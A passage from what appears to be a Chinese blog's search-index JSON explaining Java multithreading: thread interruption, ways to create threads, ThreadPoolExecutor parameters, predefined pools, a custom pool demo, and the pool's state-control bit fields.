仅仅设置interrupt标志位 b.interrupt(this); // 调用如 I/O 操作定义的中断方法 return; } } interrupt0(); } // 静态方法，这个方法有点坑，调用该方法调用后会清除中断状态。 public static boolean interrupted() { return currentThread().isInterrupted(true); } // 这个方法不会清除中断状态 public boolean isInterrupted() { return isInterrupted(false); } // 上面两个方法会调用这个本地方法，参数代表是否清除中断状态 private native boolean isInterrupted(boolean ClearInterrupted); 首先讲 interrupt() 方法： interrupt 中断操作时，非自身打断需要先检测是否有中断权限，这由jvm的安全机制配置； 如果线程处于sleep, wait, join 等状态，那么线程将立即退出被阻塞状态，并抛出一个InterruptedException异常； 如果线程处于I/O阻塞状态，将会抛出ClosedByInterruptException（IOException的子类）异常； 如果线程在Selector上被阻塞，select方法将立即返回； 如果非以上情况，将直接标记 interrupt 状态； 注意：interrupt 操作不会打断所有阻塞，只有上述阻塞情况才在jvm的打断范围内，如处于锁阻塞的线程，不会受 interrupt 中断； 阻塞情况下中断，抛出异常后线程恢复非中断状态，即 interrupted = false public class ThreadTest { public static void main(String[] args) throws InterruptedException { Thread t = new Thread(new Task(\"1\")); t.start(); t.interrupt(); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { try { Thread.sleep(1000); } catch (InterruptedException e) { System.out.println(\"thread has been interrupt!\"); } System.out.println(\"isInterrupted: \" + Thread.currentThread().isInterrupted()); System.out.println(\"task \" + name + \" is over\"); } } } 输出： thread has been interrupt! isInterrupted: false task 1 is over 调用Thread.interrupted() 方法后线程恢复非中断状态 public class ThreadTest { public static void main(String[] args) throws InterruptedException { Thread t = new Thread(new Task(\"1\")); t.start(); t.interrupt(); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { System.out.println(\"first :\" + Thread.interrupted()); System.out.println(\"second:\" + Thread.interrupted()); System.out.println(\"task \" + name + \" is over\"); } } } 输出结果： first :true second:false task 1 is over 上述两种隐含的状态恢复操作，是符合常理的，因为线程标记为中断后，用户没有真正中断线程，必然将其恢复为false。理论上Thread.interrupted()调用后，如果已中断，应该执行退出操作，不会重复调用。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:1","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"1、实现Runnable接口 public class DemoThreadTask implements Runnable{ @Override public void run() { // TODO Auto-generated method stub } public static void main(String[] args) { DemoThreadTask task = new DemoThreadTask(); Thread t = new Thread(task); t.start(); ... } } 实现Runnable接口，利用Runnable实例构造Thread，是较常用且最本质实现。此构造方法相当于对Runnable实例进行一层包装，在线程t启动时，调用Thread的run方法从而间接调用target.run()： public class Thread implements Runnable { /* What will be run. */ private Runnable target; public void run() { if (target != null) { target.run(); } } ... } ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:2","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"2、继承Thread类 public class DemoThread extends Thread{ @Override //重写run方法 public void run() { // TODO Auto-generated method stub } public static void main(String[] args) { DemoThread t = new DemoThread(); t.start(); ... } } 这种实现方式是显示的继承了Thread，但从类图中我们可以看到，Thread类本身就继承自Runnable，所以继承Thread的本质依然是实现Runnable接口定义的run方法。 需要注意的是继承Thread方式，target对象为null，重写了run方法，导致方式1中的Thread原生的run方法失效，因此并不会调用到target.run()的逻辑，而是直接调用子类重写的run方法。 因为java是单根继承，此方式一般不常用。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:3","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"3、实现Callable接口并通过FutureTask包装 先看demo： public class DemoCallable implements Callable\u003cString\u003e{ @Override public String call() throws Exception { // TODO Auto-generated method stub return null; } public static void main(String[] args) throws Exception { DemoCallable c = new DemoCallable(); FutureTask\u003cString\u003e future = new FutureTask\u003c\u003e(c); Thread t = new Thread(future); t.start(); ... String result = future.get(); //同步获取返回结果 System.out.println(result); } } 实现Callable接口通过FutureTask包装，可以获取到线程的处理结果，future.get()方法获取返回值，如果线程还没执行完，则会阻塞。 这个方法里，明明没有看到run方法，没有看到Runnable，为什么说本质也是实现Runnable接口呢？ 回看开篇的类图，FutureTask实现了RunnableFuture，RunnableFuture则实现了Runnable和Future两个接口。因此构造Thread时，FutureTask还是被转型为Runnable使用。因此其本质还是实现Runnable接口。 至于FutureTask的工作原理，后续篇章继续分析。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:4","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"4、匿名内部类 匿名内部类也有多种变体，上述三种方式都可以使用匿名内部类来隐式实例化。 public class Demo{ public static void main(String[] args) throws Exception { //方式一：Thread匿名内部类 new Thread(){ @Override public void run() { // TODO Auto-generated method stub } }.start(); //方式二：Runnable匿名内部类 new Thread(new Runnable() { @Override public void run() { // TODO Auto-generated method stub } }).start(); ... } } 匿名内部类的优点在于使用方便，不用额外定义类，缺点就是代码可读性差。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:5","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"5、Lambda表达式 Lambda表达式是jdk8引入的，已不是什么新东西，现在都jdk10了。demo如下： public class Demo{ public static void main(String[] args) throws Exception { new Thread(() -\u003e System.out.println(\"running\") ).start() ; ... } } 如此简洁的Lambda表达式，有没有吸引到你呢？当然本质不多说，还是基于Runnable接口。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:6","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"6、线程池 public class DemoThreadTask implements Runnable{ @Override public void run() { // TODO Auto-generated method stub System.out.println(\"running\"); } public static void main(String[] args) { DemoThreadTask task = new DemoThreadTask(); ExecutorService ex = Executors.newCachedThreadPool(); ex.execute(task); ... } } 线程池与前面所述其他方式的区别在于执行线程的时候由ExecutorService去执行，最终还是利用Thread创建线程。线程池的优势在于线程的复用，从而提高效率。 关于线程池，后续篇章会继续详解。 7、定时器 public class DemoTimmerTask { public static void main(String[] args) throws Exception { Timer timer = new Timer(); timer.scheduleAtFixedRate((new TimerTask() { @Override public void run() { System.out.println(\"定时任务1执行了....\"); } }), 2000, 1000); } } TimerTask的实现了Runnable接口，Timer内部有个TimerThread继承自Thread，因此绕回来还是Thread + Runnable。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:7","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"ThreadPoolExecutor概述 工作中经常涉及异步任务，通常是使用多线程技术，比如线程池ThreadPoolExecutor，它的执行规则如下： Java源码里面都有大量的注释，认真读懂这些注释，就可以把握其七分工作机制了。关于ThreadPoolExecutor的解析，我们就从其类注释开始。 现将注释大致翻译如下： ExecutorService（ThreadPoolExecutor的顶层接口）使用线程池中的线程执行每个提交的任务，通常我们使用Executors的工厂方法来创建ExecutorService。 线程池解决了两个不同的问题： 提升性能：它们通常在执行大量异步任务时，由于减少了每个任务的调用开销，并且它们提供了一种限制和管理资源（包括线程）的方法，使得性能提升明显； 统计信息：每个ThreadPoolExecutor保持一些基本的统计信息，例如完成的任务数量。 为了在广泛的上下文中有用，此类提供了许多可调参数和可扩展性钩子。 但是，在常见场景中，我们预配置了几种线程池，我们敦促程序员使用更方便的Executors的工厂方法直接使用。 Executors.newCachedThreadPool（无界线程池，自动线程回收） Executors.newFixedThreadPool（固定大小的线程池）； Executors.newSingleThreadExecutor（单一后台线程）； 注：这里没有提到ScheduledExecutorService ，后续解析。 在自定义线程池时，请参考以下指南： ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"一、Core and maximum pool sizes 核心和最大线程池数量 参数 翻译 corePoolSize 核心线程池数量 maximumPoolSize 最大线程池数量 线程池执行器将会根据corePoolSize和maximumPoolSize自动地调整线程池大小。 当在execute(Runnable)方法中提交新任务并且少于corePoolSize线程正在运行时，即使其他工作线程处于空闲状态，也会创建一个新线程来处理该请求。 如果有多于corePoolSize但小于maximumPoolSize线程正在运行，则仅当队列已满时才会创建新线程。 通过设置corePoolSize和maximumPoolSize相同，您可以创建一个固定大小的线程池。 通过将maximumPoolSize设置为基本上无界的值，例如Integer.MAX_VALUE，您可以允许池容纳任意数量的并发任务。 通常，核心和最大池大小仅在构建时设置，但也可以使用setCorePoolSize和setMaximumPoolSize进行动态更改。 这段话详细了描述了线程池对任务的处理流程，这里用个图总结一下 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:1","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"二、prestartCoreThread 核心线程预启动 在默认情况下，只有当新任务到达时，才开始创建和启动核心线程，但是我们可以使用 prestartCoreThread() 和 prestartAllCoreThreads() 方法动态调整。 如果使用非空队列构建池，则可能需要预先启动线程。 方法 作用 prestartCoreThread() 创一个空闲任务线程等待任务的到达 prestartAllCoreThreads() 创建核心线程池数量的空闲任务线程等待任务的到达 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:2","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"三、ThreadFactory 线程工厂 新线程使用ThreadFactory创建。 如果未另行指定，则使用Executors.defaultThreadFactory默认工厂，使其全部位于同一个ThreadGroup中，并且具有相同的NORM_PRIORITY优先级和非守护进程状态。 通过提供不同的ThreadFactory，您可以更改线程的名称，线程组，优先级，守护进程状态等。如果ThreadCactory在通过从newThread返回null询问时未能创建线程，则执行程序将继续，但可能无法执行任何任务。 线程应该有modifyThread权限。 如果工作线程或使用该池的其他线程不具备此权限，则服务可能会降级：配置更改可能无法及时生效，并且关闭池可能会保持可终止但尚未完成的状态。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:3","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"四、Keep-alive times 线程存活时间 如果线程池当前拥有超过corePoolSize的线程，那么多余的线程在空闲时间超过keepAliveTime时会被终止 ( 请参阅getKeepAliveTime(TimeUnit) )。这提供了一种在不积极使用线程池时减少资源消耗的方法。 如果池在以后变得更加活跃，则应构建新线程。 也可以使用方法setKeepAliveTime(long，TimeUnit)进行动态调整。 防止空闲线程在关闭之前终止，可以使用如下方法： setKeepAliveTime(Long.MAX_VALUE，TimeUnit.NANOSECONDS); 默认情况下，keep-alive策略仅适用于存在超过corePoolSize线程的情况。 但是，只要keepAliveTime值不为零，方法allowCoreThreadTimeOut(boolean)也可用于将此超时策略应用于核心线程。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:4","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"五、Queuing 队列 BlockingQueue用于存放提交的任务，队列的实际容量与线程池大小相关联。 如果当前线程池任务线程数量小于核心线程池数量，执行器总是优先创建一个任务线程，而不是从线程队列中取一个空闲线程。 如果当前线程池任务线程数量大于核心线程池数量，执行器总是优先从线程队列中取一个空闲线程，而不是创建一个任务线程。 如果当前线程池任务线程数量大于核心线程池数量，且队列中无空闲任务线程，将会创建一个任务线程，直到超出maximumPoolSize，如果超时maximumPoolSize，则任务将会被拒绝。 这个过程参考[线程任务处理流程图] 主要有三种队列策略： Direct handoffs 直接握手队列 Direct handoffs 的一个很好的默认选择是 SynchronousQueue，它将任务交给线程而不需要保留。这里，如果没有线程立即可用来运行它，那么排队任务的尝试将失败，因此将构建新的线程。 此策略在处理可能具有内部依赖关系的请求集时避免锁定。Direct handoffs 通常需要无限制的maximumPoolSizes来避免拒绝新提交的任务。 但得注意，当任务持续以平均提交速度大余平均处理速度时，会导致线程数量会无限增长问题。 Unbounded queues 无界队列 当所有corePoolSize线程繁忙时，使用无界队列（例如，没有预定义容量的LinkedBlockingQueue）将导致新任务在队列中等待，从而导致maximumPoolSize的值没有任何作用。当每个任务互不影响，完全独立于其他任务时，这可能是合适的; 例如，在网页服务器中， 这种队列方式可以用于平滑瞬时大量请求。但得注意，当任务持续以平均提交速度大余平均处理速度时，会导致队列无限增长问题。 Bounded queues 有界队列 一个有界的队列（例如，一个ArrayBlockingQueue）和有限的maximumPoolSizes配置有助于防止资源耗尽，但是难以控制。队列大小和maximumPoolSizes需要 相互权衡： 使用大队列和较小的maximumPoolSizes可以最大限度地减少CPU使用率，操作系统资源和上下文切换开销，但会导致人为的低吞吐量。如果任务经常被阻塞（比如I/O限制），那么系统可以调度比我们允许的更多的线程。 使用小队列通常需要较大的maximumPoolSizes，这会使CPU更繁忙，但可能会遇到不可接受的调度开销，这也会降低吞吐量。 这里主要为了说明有界队列大小和maximumPoolSizes的大小控制，若何降低资源消耗的同时，提高吞吐量 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:5","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"六、Rejected tasks 拒绝任务 拒绝任务有两种情况：1. 线程池已经被关闭；2. 任务队列已满且maximumPoolSizes已满； 无论哪种情况，都会调用RejectedExecutionHandler的rejectedExecution方法。预定义了四种处理策略： AbortPolicy：默认测策略，抛出RejectedExecutionException运行时异常； CallerRunsPolicy：这提供了一个简单的反馈控制机制，可以减慢提交新任务的速度； DiscardPolicy：直接丢弃新提交的任务； DiscardOldestPolicy：如果执行器没有关闭，队列头的任务将会被丢弃，然后执行器重新尝试执行任务（如果失败，则重复这一过程）； 我们可以自己定义RejectedExecutionHandler，以适应特殊的容量和队列策略场景中。 七、Hook methods 钩子方法 ThreadPoolExecutor为提供了每个任务执行前后提供了钩子方法，重写beforeExecute(Thread，Runnable)和afterExecute(Runnable，Throwable)方法来操纵执行环境； 例如，重新初始化ThreadLocals，收集统计信息或记录日志等。此外，terminated()在Executor完全终止后需要完成后会被调用，可以重写此方法，以执行任殊处理。 注意：如果hook或回调方法抛出异常，内部的任务线程将会失败并结束。 八、Queue maintenance 维护队列 getQueue()方法可以访问任务队列，一般用于监控和调试。绝不建议将这个方法用于其他目的。当在大量的队列任务被取消时，remove()和purge()方法可用于回收空间。 九、Finalization 关闭 如果程序中不在持有线程池的引用，并且线程池中没有线程时，线程池将会自动关闭。如果您希望确保即使用户忘记调用 shutdown()方法也可以回收未引用的线程池，使未使用线程最终死亡。那么必须通过设置适当的 keep-alive times 并设置allowCoreThreadTimeOut(boolean) 或者 使 corePoolSize下限为0 。 一般情况下，线程池启动后建议手动调用shutdown()关闭。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:2:6","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"ThreadPoolExecutor使用 我们以最后一个构造方法（参数最多的那个），对其参数进行解释： public ThreadPoolExecutor(int corePoolSize, // 1 int maximumPoolSize, // 2 long keepAliveTime, // 3 TimeUnit unit, // 4 BlockingQueue\u003cRunnable\u003e workQueue, // 5 ThreadFactory threadFactory, // 6 RejectedExecutionHandler handler ) { //7 if (corePoolSize \u003c 0 || maximumPoolSize \u003c= 0 || maximumPoolSize \u003c corePoolSize || keepAliveTime \u003c 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } 序号 名称 类型 含义 1 corePoolSize int 核心线程池大小 2 maximumPoolSize int 最大线程池大小 3 keepAliveTime long 线程最大空闲时间 4 unit TimeUnit 时间单位 5 workQueue BlockingQueue 线程等待队列 6 threadFactory ThreadFactory 线程创建工厂 7 handler RejectedExecutionHandler 拒绝策略 如果对这些参数作用有疑惑的请看 ThreadPoolExecutor概述。 知道了各个参数的作用后，我们开始构造符合我们期待的线程池。首先看JDK给我们预定义的几种线程池： ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:3:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"一、预定义线程池 FixedThreadPool public static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u003cRunnable\u003e()); } corePoolSize与maximumPoolSize相等，即其线程全为核心线程，是一个固定大小的线程池，是其优势； keepAliveTime = 0 该参数默认对核心线程无效，而FixedThreadPool全部为核心线程； workQueue 为LinkedBlockingQueue（无界阻塞队列），队列最大值为Integer.MAX_VALUE。如果任务提交速度持续大余任务处理速度，会造成队列大量阻塞。因为队列很大，很有可能在拒绝策略前，内存溢出。是其劣势； FixedThreadPool的任务执行是无序的； 适用场景：可用于Web服务瞬时削峰，但需注意长时间持续高峰情况造成的队列阻塞。 CachedThreadPool public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue\u003cRunnable\u003e()); } corePoolSize = 0，maximumPoolSize = Integer.MAX_VALUE，即线程数量几乎无限制； keepAliveTime = 60s，线程空闲60s后自动结束。 workQueue 为 SynchronousQueue 同步队列，这个队列类似于一个接力棒，入队出队必须同时传递，因为CachedThreadPool线程创建无限制，不会有队列等待，所以使用SynchronousQueue； 适用场景：快速处理大量耗时较短的任务，如Netty的NIO接受请求时，可使用CachedThreadPool。 SingleThreadExecutor public static ExecutorService newSingleThreadExecutor() { return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u003cRunnable\u003e())); } 咋一瞅，不就是newFixedThreadPool(1)吗？定眼一看，这里多了一层FinalizableDelegatedExecutorService包装，这一层有什么用呢，写个dome来解释一下： public static void main(String[] args) { ExecutorService fixedExecutorService = Executors.newFixedThreadPool(1); ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) fixedExecutorService; System.out.println(threadPoolExecutor.getMaximumPoolSize()); threadPoolExecutor.setCorePoolSize(8); ExecutorService singleExecutorService = Executors.newSingleThreadExecutor(); // 运行时异常 java.lang.ClassCastException // ThreadPoolExecutor threadPoolExecutor2 = (ThreadPoolExecutor) singleExecutorService; } 对比可以看出，FixedThreadPool可以向下转型为ThreadPoolExecutor，并对其线程池进行配置，而SingleThreadExecutor被包装后，无法成功向下转型。因此，SingleThreadExecutor被定以后，无法修改，做到了真正的Single。 ScheduledThreadPool public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) { return new ScheduledThreadPoolExecutor(corePoolSize); } newScheduledThreadPool调用的是ScheduledThreadPoolExecutor的构造方法，而ScheduledThreadPoolExecutor继承了ThreadPoolExecutor，构造是还是调用了其父类的构造方法。 public ScheduledThreadPoolExecutor(int corePoolSize) { super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS, new DelayedWorkQueue()); } 对于ScheduledThreadPool本文不做描述，其特性请关注后续篇章。详细参考附录。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:3:1","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"二、自定义线程池 以下是自定义线程池，使用了有界队列，自定义ThreadFactory和拒绝策略的demo： import java.io.IOException; import java.util.concurrent.*; import java.util.concurrent.atomic.AtomicInteger; public class ThreadPoolTest { public static void main(String[] args) { int corePoolSize = 2; int maximumPoolSize = 4; long keepAliveTime = 10; TimeUnit unit = TimeUnit.SECONDS; // BlockingQueue\u003cRunnable\u003e workQueue = new ArrayBlockingQueue\u003c\u003e(2); BlockingQueue\u003cRunnable\u003e workQueue = new LinkedBlockingQueue\u003c\u003e(2); ThreadFactory threadFactory = new NameThreadFactory(); RejectedExecutionHandler rejectedExecutionHandler = new MyIgnorePolicy(); ThreadPoolExecutor tpexecutor = new ThreadPoolExecutor(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, rejectedExecutionHandler); // 预启动所有核心线程 tpexecutor.prestartAllCoreThreads(); for (int i = 1; i \u003c= 10; i++) { MyTask myTask = new MyTask(String.valueOf(i)); tpexecutor.execute(myTask); } try { //阻塞主线程 System.in.read(); } catch (IOException e) { e.printStackTrace(); } } static class NameThreadFactory implements ThreadFactory { private final AtomicInteger mThreadNum = new AtomicInteger(1); @Override public Thread newThread(Runnable r) { Thread t = new Thread(r, \"my-thread-\" + mThreadNum.getAndIncrement()); System.out.println(t.getName() + \" has been created\"); return t; } } public static class MyIgnorePolicy implements RejectedExecutionHandler { @Override public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) { doLog(r, executor); } private void doLog(Runnable r, ThreadPoolExecutor executor) { System.err.println(r.toString() + \" rejected\"); System.out.println(\"getCompletedTaskCount: \" + executor.getCompletedTaskCount()); } } public static class MyTask implements Runnable { private String name; public MyTask(String name) { this.name = name; } @Override public void run() { try { System.out.println(this.toString() + \"is running!\"); //让任务执行慢点 Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } } public String getName() { return name; } public String toString() { return \"MyTask [name=\" + name + \"]\"; } } } 输出结果如下： my-thread-1 has been created my-thread-2 has been created my-thread-3 has been created MyTask [name=2]is running! MyTask [name=1]is running! my-thread-4 has been created MyTask [name=3]is running! MyTask [name=6]is running! getCompletedTaskCount: 0 getCompletedTaskCount: 0 getCompletedTaskCount: 0 getCompletedTaskCount: 0 MyTask [name=7] rejected MyTask [name=8] rejected MyTask [name=9] rejected MyTask [name=10] rejected MyTask [name=4]is running! MyTask [name=5]is running! 其中线程线程1-4先占满了核心线程和最大线程数量[4]，然后4、5线程进入等待队列[队列大小为4]，7-10线程被直接忽略拒绝执行，等1-4线程中有线程执行完后通知4、5线程继续执行。 说明：自定义线程池参数可以根据具体业务场景配置。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:3:2","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"ThreadPoolExecutor状态控制 读懂ThreadPoolExecutor执行原理，需要先掌握其状态控制的方式，因为使用了大量位运算，读起来有点吃力，所以单独用一篇文章分析。以下是ThreadPoolExecutor状态控制的主要变量和方法： //原子状态控制数 private final AtomicInteger ctl = new AtomicInteger(ctlOf(RUNNING, 0)); //29比特位 private static final int COUNT_BITS = Integer.SIZE - 3; //实际容量 2^29-1 private static final int CAPACITY = (1 \u003c\u003c COUNT_BITS) - 1; // runState is stored in the high-order bits // runState存储在高位中 private static final int RUNNING = -1 \u003c\u003c COUNT_BITS; private static final int SHUTDOWN = 0 \u003c\u003c COUNT_BITS; private static final int STOP = 1 \u003c\u003c COUNT_BITS; private static final int TIDYING = 2 \u003c\u003c COUNT_BITS; private static final int TERMINATED = 3 \u003c\u003c COUNT_BITS; // Packing and unpacking ctl 打包和解压ctl // 解压runState private static int runStateOf(int c) { return c \u0026 ~CAPACITY; } // 解压workerCount private static int workerCountOf(int c) { return c \u0026 CAPACITY; } // 打包ctl private static int ctlOf(int rs, int wc) { return rs | wc; } 线程池使用一个AtomicInteger的ctl变量将 workerCount（工作线程数量）和 runState（运行状态）两个字段压缩在一起 ，这种做法在在java源码里经常有出现，如在 ReentrantReadWriteLock 里就将一个int分成高16位和底16位，分别表示读锁状态和写锁状态。ThreadPoolExecutor里也是使用了同样的思想，表现得更加复杂。 ThreadPoolExecutor用3个比特位表示runState， 29个比特位表示workerCount。因此这里需要特别说明的是： 确切的说，当最大线程数量配置为Integer.MXA_VAULE时，ThreadPoolExecutor的线程最大数量依然是2^29-1。 目前来看这是完全够用的，但随着计算机的不断发展，真的到了不够用的时候可以改变为AtomicLong。这如同32位系统时间戳会在2038年01月19日03时14分07秒耗尽一样，当以后我们的系统线程能够超过2^29-1时，这些代码就需要调整了。对于未来，无限可能。 思考一下为什么是29：3呢？ 这是因为我们的运营状态有5种，向上取2次方数，2^3 = 8。所以必须要3个比特位来表示各种状态。 运行状态解释： 状态 解释 RUNNING 运行态，可处理新任务并执行队列中的任务 SHUTDOW 关闭态，不接受新任务，但处理队列中的任务 STOP 停止态，不接受新任务，不处理队列中任务，且打断运行中任务 TIDYING 整理态，所有任务已经结束，workerCount = 0 ，将执行terminated()方法 TERMINATED 结束态，terminated() 方法已完成 整个ctl的状态，会在线程池的不同运行阶段进行CAS转换。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:4:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"ThreadPoolExecutor执行原理 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:5:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"execute() 分析ThreadPoolExecutor的执行原理，直接从execute方法开始 public void execute(Runnable command) { if (command == null) throw new NullPointerException(); int c = ctl.get(); // 1、工作线程 \u003c 核心线程 if (workerCountOf(c) \u003c corePoolSize) { if (addWorker(command, true)) return; c = ctl.get(); } // 2、运行态，并尝试将任务加入队列 if (isRunning(c) \u0026\u0026 workQueue.offer(command)) { int recheck = ctl.get(); if (! isRunning(recheck) \u0026\u0026 remove(command)) reject(command); else if (workerCountOf(recheck) == 0) addWorker(null, false); } // 3、使用尝试使用最大线程运行 else if (!addWorker(command, 